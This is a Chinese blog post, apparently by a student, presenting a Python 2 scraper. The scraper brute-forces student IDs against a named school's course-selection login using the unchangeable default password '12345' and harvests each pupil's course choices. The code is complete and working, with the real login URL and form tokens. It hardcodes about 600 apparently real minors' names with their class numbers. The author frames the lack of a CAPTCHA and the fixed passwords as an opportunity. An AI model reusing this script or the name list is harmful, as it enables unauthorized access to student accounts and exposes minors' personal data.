从下午到现在，实现了一个爬虫，用来爬二中高一普通班学籍。爬了一小时了，还没爬完，预计还得两个钟。

主要是利用选课系统没有更改密码功能的漏洞，穷举学号，配合二中官网开学时放出的分班信息，获取每个人的选课信息及学号。

第一次写python，边学边做，跟着博客走，照葫芦画瓢，没走弯路。在csdn上发现一位神人Hoxily，在杭电ACM上利用手动生成错误信息(out of memory, out of time ...)，写了一个提取测试样例的爬虫！太聪明了！

非常感谢各位提供方便的博主！

这次遇到了不少困难，虽然都解决了，但是造成了不少麻烦。在此记录一下，警醒自己。

# 平时要注意数据的收集

这次为了找开学放出的分班名单，花了两个小时。先是去官网看，已经下架了。然后用各搜索引擎的快照功能，发现百度没有快照，必应搜狗压根没有收录，360雅虎的快照打不开。最后是用了uuuvpn上谷歌才看到快照，提取了分班信息。

感谢uuuvpn的免费试用。之前还试了51vpn和91vpn还有42.32.1964，速度都慢到爆炸，连google都打不开。

有些数据，是过了这个村就没有这个店的。平时必须注意收集！这次爬虫也是一样，明文密码！还改不了！千载难逢的好机会。

# 不要自己瞎想

要吸取别人的成果，这样一来节约时间，二来减少了重复性思考。

# python环境

python要用2的版本，因为博客上都是2. 不要用自带的IDE，用sublime+控制台

# 必须写gui！
目前的最终版本是输出Html的，爬了一半懒得改了。

html太大根本打不开，火狐sublime都要读半天。而且还有meta charset坑。

gui实现暂停-断点续传功能很方便，一个button即可。还要一个表格，显示已经爬好的数据，还要一个状态栏，显示正在爬什么，这样就可以检测网络异常，手动进行重启。

# 注意timeout

# 像这样的一次性脚本，能用就好，优雅是次要的

比方说，读入学生姓名-班级数据库的时候，由于姓名是中文的，所以出了不少麻烦，最后也没解决中文输入的问题。最后的解决方式是，用excel转置矩阵，再用sublime的正则把矩阵重排成数组形式，直接hardcode进代码。这在之后的代码里可以看到。

# 不要删作品

这种东西以后还会用到，留着以后参考。

# 用什么语言

用什么语言不是取决于你的熟悉程度，而是取决于用整个语言解决类似问题的人多不多！人多了，网上博客一搜一大堆，就像这个脚本，稍微改改别人的代码就行。

当然，这个可能对一些学习语言很慢的人不管用。

# github写文档是最方便的

# 数据尽量纯文本

否则，读入的时候需要各种库，时间耗不起。

# 一定要有断点续传功能！！

万一管理员把ip blacklist了，我怎么办？再写个脚本从html里抓太慢了，应该预先考虑到这种情况，使用良好的文件格式（如某ml系列）。否则，导入的时候将非常麻烦。

# 自己的网站一定要设验证码

不然模拟登录会非常容易。

# -----------------------------------------------------

# 下面是代码：
```python
# -*- coding: utf-8 -*-
import HTMLParser  
import urlparse  
import urllib  
import urllib2  
import cookielib  
import string  
import re

## 应元班 重点班 123 16 17 18 无数据


# 读入矩阵
names = ['何浩然', '刘雅欣', '刘株州', '利子杰', '缪文康', '郑智瀚', '任泽楷', '秦月',  '张裕喜', '陈宇恒', '朱思悦', '周思源', '李弘亮', '李泽琪', '陈健',  '覃世康', '陈厚其', '梁嘉晖', '王钧灏', '张文斐', '方书欣', '邱雨欣', '龙骁来', '陈松语', '陈绮晴', '黎骁睿', '陈海茵', '田宇霄', '范欣',  '张玮殷', '朱昊程', '李虹霖', '李倩雯', '梁康蕾', '卢嘉钦', '谭量泓', '朱紫缘', '韩云豪', '韩沛馨', '廖俊翔', '叶诗桐', '宋浩铭', '汤婕',  '李子成', '麦佩君', '陆宏健', '蔡晓岚', '李维熙', '陈林森', '梁东海', '赵梓潼', '夏梓骞', '罗宁凡', '吴一凡', '李如晔', '张旻',  '苏振威', '罗熹妮', '苏畅',  '蔡馨葶', '杨诵弦', '张展鹏', '陈湉',  '文静雅', '谭永图', '陈旭安', '黄柏净', '茹靖雯', '陈琪伟', '陈晓莉', '冯欣',  '陈普瑞', '余启逸', '梁力朋', '李若璇', '朱瑞琦', '叶淏丹', '杨睿',  '卢子瑜', '何婉莹', '张宇浩', '唐嘉蕾', '谭谣',  '黄琼燕', '蓝婕',  '邵舒恒', '周恒志', '温臻一', '文中',  '陈俊汶', '张心怡', '李子添', '苏睿韬', '张子扬', '邓泽轩', '黎芷嫣', '袁炀懿', '彭震宇', '王珺瑀', '刘炯敏', '陈坚',  '唐嘉唯', '赖怡霏', '罗易',  '卢祉萦', '方茂州', '张雅坤', '张苒桦', '莫懿恒', '杨敏怡', '陈迪威', '蒋心语', '郑添鑫', '董逸凯', '梁珈源', '杨阳',  '叶思龙', '黄楚芸', '冯栩君', '易今',  '梁嘉倩', '林彦达', '彭迪轩', '刘思蔚', '王琢',  '赵昕',  '梁越',  '王子豪', '周国昱', '汤芷轩', '潘馨郡', '梁焕仪', '杨结怡', '刘昭阳', '麦詠诗', '李向龙', '芦启航', '林芷而', '金晓芸', '马晨曦', '杨博文', '米菲儿', '蔡心洋', '陆泳天', '农晓彤', '唐嘉慧', '钟子桐', '陈文萱', '周涵颖', '赖烨文', '温雅旻', '黄韶煊', '唐宝杰', '赖炫君', '梁馨原', '张馨冉', '杨喆彦萱',    '吕楠',  '张伟鸿', '蔡龄萱', '李兆杰', '范俊贤', '孔紫璐', '张瑞琪', '麦楚琪', '陈力',  '曾桂昌', '刘润尧', '段皖湘', '虞靖洋', '孙致一', '吴亚煊', '晏嵘皓', '李乐薇', '袁紫瑜', '张浩轩', '黄琨普', '王铭乐', '张锟',  '列梓聪', '龙子儒', '幸明瑶', '吴翰章', '张正祥', '谢雨菲', '叶栩汝', '王毅仁', '尹杰',  '唐瑭',  '沈宇琦', '董月箫', '钟禧儿', '余晓川', '冯浩贤', '魏奕衡', '庞嘉盈', '周思凡', '罗安霓', '郑艺涵', '李泽海', '廖立楷', '丘月荔', '杨咏晴', '朱芷怡', '范诗琳', '范洁儿', '章一彤', '胡倩昭', '谭贤明', '任鸿炜', '骆庆洲', '颜汇杭', '陈梓婷', '潘蔚舜', '彭涛',  '陈昱蕾', '赵其诺', '林睿',  '麦琛妍', '刘雪儿', '曾国殷', '宋星瑜', '谢茂霖', '何德儒', '卢政州', '王宝民', '马愈淇', '赵淑祺', '张洁',  '梁洪邦', '黄健煜', '曹昕怡', '朱婧安', '林悦然', '刘家轩', '李泳思', '梁梓瑜', '吕奕豪', '肖梓杰', '李婷',  '吴英祺', '罗万鑫', '李凯茵', '梁倩瑜', '龙碧凝', '巫校涛', '黄静',  '陈子琦', '毛睿哲', '曾嵘',  '谭鑫',  '夏睿',  '王浩潼', '杨钒瑜', '王贤杰', '黄思昕', '龚国龙', '谢祉霖', '闫俊文', '黄文程', '陈韵然', '秦淑冰', '成柄臻', '陈梁炜', '彭婧芙', '任世龙', '关兴洲', '刘浩宇', '胡钰成', '夏禹恒', '薛佳佳', '甘惟',  '王思彤', '邓博文', '姚正耀', '郑芷晴', '吴桐',  '樊澍欣', '刘家瑞', '梁静怡', '陈杰',  '李文浩', '袁浩轩', '罗盈欣', '程玉琳', '沈蕴瑶', '陈欣然', '任昱臻', '胡卓贤', '许诺',  '陈子晴', '杨沛东', '黎芷颖', '吴诗雨', '刘嘉明', '陈紫欣', '杨坤',  '薛俊和', '张心悦', '李敬涛', '钟理思', '李一帆', '张纤华', '杨宗原', '李俊发', '陈欣',  '陈映桦', '梁泽君', '任缘',  '刘泽南', '杨昕宇', '丁盈菲', '刘镇源', '江沛榆', '陈锶泓', '陈章妮', '曾宪泽', '李跃鹏', '吴子萍', '伍睿翘', '王浩钧', '郭栩然', '朱亦潼', '袁之彬', '黄泽昊', '杨芮溦', '陈泽广', '岳宇洋', '李振希', '申肖雨涵',    '毛嘉铭', '易韵琪', '马斯颖', '黄耀莹', '余隽宜', '梁璨上', '马芮',  '黄宜乐', '宋乐仪', '莫小璇', '刘玮业', '梁一航', '陶鹏飞', '嵇雨晨', '周熙明', '钟明瀚', '黄小丫', '李欣',  '钟纶涛', '何佳家', '赵志强', '张敬轩', '黄楚芃', '孙梓宣', '余蕊廷', '钟理恩', '胡志璇', '黄梓雯', '罗兆斌', '蔡靖茹', '廖文亦', '冯芊慧', '解晨东', '徐贝麟', '王耀林', '刘羽杰', '莫云晓', '傅钰淇', '陈柏滔', '刘怡萱', '李琦',  '梁展睿', '李龙飞', '蔡奕乔', '冯志恒', '卢恺滢', '曾德培', '萧乐夫', '冯晓翎', '陈嵘浩', '范羽菲', '陈博',  '杨心仪', '蔡雅雯', '卓越',  '杨蕾蕾', '蒋恬励', '翁泽嘉', '吴蔚',  '谢妍',  '温臻至', '何蕴琪', '戚凯飞', '杨晓晴', '谭淑仪', '黎建棠', '陈锦添', '钟伟鹏', '郑开元', '史亚楠', '詹琪祺', '罗文韬', '洪肖琦', '吴宇宁', '张雨欣', '黄广治', '黎炜',  '李焯樾', '杜爔堂', '崔钰蓉', '王智敏', '佘博飞', '谢凌珊', '李泽辉', '王慧',  '陈卓文', '肖淼',  '周鸿凯', '高鸿恺', '段至浩', '谭文翀', '韦旭东', '郭昊天', '陈美君', '梁中宜', '李梓豪', '吕佳澍', '卫梓懿', '王知愚', '丘健堃', '龙润镇', '石婉彤', '黄泽斌', '梁熙桐', '郑楷鸣', '冯葆莹', '秦实果果',    '刘苾宸', '冯雪儿', '徐艺萱', '唐灵犀', '储宇杰', '钟梦哲', '黄雨哲', '贾含章', '郑德生', '李晓婷', '郑晓晴', '温梓希', '黄子翀', '钟振华', '常泳淇', '任祖儿', '莫颖峻', '汤婷婷', '陈潍',  '刘镇滔', '黄子懿', '陈漠烟', '朱明辉', '潘玮瑄', '赵欣怡', '李俊翔', '熊依洋', '肖敏莉', '旋俊杰', '朱友蓉', '谢晓茹', '黄子珊', '刘炜诚', '周思慧', '陈卉欣', '邹尔沁', '李洁辉', '陈苑清', '杨卓桓', '龙宇婷', '鞠圆圆', '李阳之', '刘行',  '肖怿玮', '杨翊翀', '胡宇沁', '刘炽斌', '赵梓轩', '赵鲁月', '何浩鑫', '陈舒敏', '李帷琛', '陈罗成', '乐泽哲', '梁鸿艺', '李欣',  '罗婧怡', '陈一川', '许泽森', '柳韵',  '李浩源', '李德璨', '仓子惠', '左曾妮', '黄晓乐', '朱丹平', '张蔚羚', '李亚太', '周立枫', '李伊程', '胡婧萱', '郑子津', '鲍亭妤', '熊思力', '蔡育燊', '周弘益', '梁宇斌', '黄淏泓', '谢羽',  '熊可玥', '蔡志阳', '陈智涛', '杨靖',  '陈璐',  '郭正浩', '罗冰玲', '薛卫衡', '张桢',  '张丽璇', '彭佳镝', '孙悦淇', '程卓',  '肖鸿浩', '何子阳', '刘洋冰', '蔡颖超', '曾君龙', '陈少荣', '廖峻屹', '曾莉淇', '谢楚灵', '郑小烨', '刘秧子', '潘煜儿', '潘卓',  '曾政',  '左慧燕', '梁雅媚', '吴京涵', '苏巧娟', '钟颖杭', ]
clss = [4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   4,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   5,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   6,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   7,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   8,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   9,   10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  10,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  11,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  12,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  13,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  14,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  15,  ]

selected_nos = [ ]
result_all = []

##############################################################


# 抓取

#登录的主页面  
hosturl = 'http://android.gdgzez.com.cn/szxy/yanjiuxingxuexi/student_login.aspx' #自己填写  
#post数据接收和处理的页面（我们要向这个页面发送我们构造的Post数据）  
posturl = 'http://android.gdgzez.com.cn/szxy/yanjiuxingxuexi/student_login.aspx' #从数据包中分析出，处理post请求的url  
  
#设置一个cookie处理器，它负责从服务器下载cookie到本地，并且在发送请求时带上本地的cookie  
cj = cookielib.LWPCookieJar()  
cookie_support = urllib2.HTTPCookieProcessor(cj)  
opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)  
urllib2.install_opener(opener)  
  
#打开登录主页面（他的目的是从页面下载cookie，这样我们在再送post数据时就有cookie了，否则发送不成功）  
h = urllib2.urlopen(hosturl)  
  
#构造header，一般header至少要包含一下两项。这两项是从抓到的包里分析得出的。  
headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',  
           'Referer' : 'http://android.gdgzez.com.cn/szxy/yanjiuxingxuexi/student_login.aspx'}  

print "<meta charset='utf-8'>"

def spider_one_time(i):
    no_num = 0
    name = names[i]
    clas = clss[i]

    print "<h1>No. %d %s of No. %s Class</h1>" % (i, name, clas)

    while no_num <= 51:
        no_num += 1
        no = "2016%02d%02d" % (clas, no_num)

        sflag = False
        for selected_no in selected_nos:
        	if selected_no == no:
        		print "<h2>%s selected. Skipped.</h2>" % selected_no
        		sflag = True
        		break

        if sflag:
        	continue

        print "<h2>Try %s</h2>" % no
        #构造Post数据，他也是从抓大的包里分析得出的。  
        postData = {'__VIEWSTATE' : '/wEPDwULLTE3NzI1OTE3OTFkZJk4xBOpTGvHILGFeCbFQfQQv9dbWzdoB6AOexN4BTx0',  
                    '__EVENTVALIDATION' : '/wEWBQLMmfO1BgL7uPQdAt765bwOAsaZ0ZUMApn3i+sBQi9nlVqoFrBfAjkxtVAWnUBZPnKm6VON7F01iBJzBXw=',  
                    'name' : name, #你的用户名  
                    'pwd' : '12345', #你的密码，密码可能是明文传输也可能是密文，如果是密文需要调用相应的加密算法加密  
                    'btnchange' : '登录',   #特有数据，不同网站可能不同  
                    'xuehao' : no  #特有数据，不同网站可能不同  
          
                    }  
          
        #需要给Post数据编码  
        postData = urllib.urlencode(postData)  
          
        #通过urllib2提供的request方法来向指定Url发送我们构造的数据，并完成登录过程  
        request = urllib2.Request(posturl, postData, headers)
        try:   
            response = urllib2.urlopen(request, timeout=30)  
            text = response.read()
        except Exception,e:
            print "<h3>Out of Time Now Retry %s</h3>" % str(e)
            no_num -= 1
            continue

        print "<h3>Request</h3><div>%s</div><h3>Text</h3><div>%s</div>" % (request, text)
        
        p = re.compile('<[^>]+>')
        text = p.sub("", text)
        p = re.compile('\s+')
        text = p.sub("", text)
        p = re.compile('我的选课.STYLE1{COLOR:#ff0000}//选课首页老师登录学生登陆课程列表我要选课我的选课退出系统修改密码广州市第二中学选课系统--我的课程课程信息课程编号学期编号课程名称任课教师上课地点退选')
        text = p.sub("", text)
        p = re.compile('退选考核.+')
        text = p.sub("", text)

        print "<h3>Clear Text</h3><div>%s</div>" % text

        if text.find('alert') == -1:
            resstr = "%s %s %s" % (name, no, text)
            print "<h3>Found %s</h3>" % resstr
            selected_nos.append(no)
            result_all.append(resstr)
            break
        else:
            print "<h3>Nope</h3>"

################################################################################3

# 执行

for i in range(0, len(names)):
    spider_one_time(i)

print "<h1>Finished Total %d</h1>" % len(result_all)

for resstr in result_all:
    print "<h2>%s</h2>" % resstr
```

最后，感谢管理员没有设置验证码，否则这个脚本是绝对不能做出来的。

另外，POST的数据里有两个固定的东西，

```
        postData = {'__VIEWSTATE' : '/wEPDwULLTE3NzI1OTE3OTFkZJk4xBOpTGvHILGFeCbFQfQQv9dbWzdoB6AOexN4BTx0',  
                    '__EVENTVALIDATION' : '/wEWBQLMmfO1BgL7uPQdAt765bwOAsaZ0ZUMApn3i+sBQi9nlVqoFrBfAjkxtVAWnUBZPnKm6VON7F01iBJzBXw=',  
```

这是什么东东？这个东西从中午一直用到晚上，好像根本没改过。

# 最后再说一下流程吧

1. 人肉登录，分析POST
2. 采集用户数据
3. 写爬虫以及爬虫内部的数据处理程序
